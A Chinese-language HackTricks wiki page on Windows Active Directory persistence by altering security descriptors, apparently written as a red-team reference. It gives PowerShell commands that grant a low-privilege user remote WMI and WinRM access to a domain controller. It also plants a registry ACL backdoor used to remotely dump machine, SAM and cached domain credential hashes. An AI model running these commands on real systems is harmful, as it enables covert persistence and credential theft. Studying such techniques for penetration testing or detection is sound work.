# 安全描述符

<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库**提交PR来分享您的黑客技巧**。

</details>

## 安全描述符

安全描述符定义语言（SDDL）定义了用于描述安全描述符的格式。SDDL使用ACE字符串表示DACL和SACL：`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**安全描述符**用于**存储**一个**对象**对**另一个对象**的**权限**。如果您能对一个对象的**安全描述符**进行**微小的更改**，您可以获得对该对象的非常有趣的权限，而无需成为特权组的成员。

因此，这种持久化技术基于获得对某些对象的每一个所需权限的能力，以便能够执行通常需要管理员权限的任务，但无需成为管理员。

### 访问WMI

您可以给予用户权限**远程执行WMI** [**使用这个**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)：
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### 访问WinRM

授予用户访问**winrm PS控制台的权限**[**使用此方法**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**：**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### 远程访问哈希值

通过创建一个使用 [**DAMP**](https://github.com/HarmJ0y/DAMP) 的 **Reg 后门**，访问**注册表**并**转储哈希值**，这样你可以随时检索**计算机的哈希值**、**SAM** 以及计算机中任何**缓存的 AD** 凭据。因此，将这个权限授予**针对域控制器计算机的普通用户**非常有用：
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
查看[**Silver Tickets**](silver-ticket.md)学习如何使用域控制器计算机账户的哈希。

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
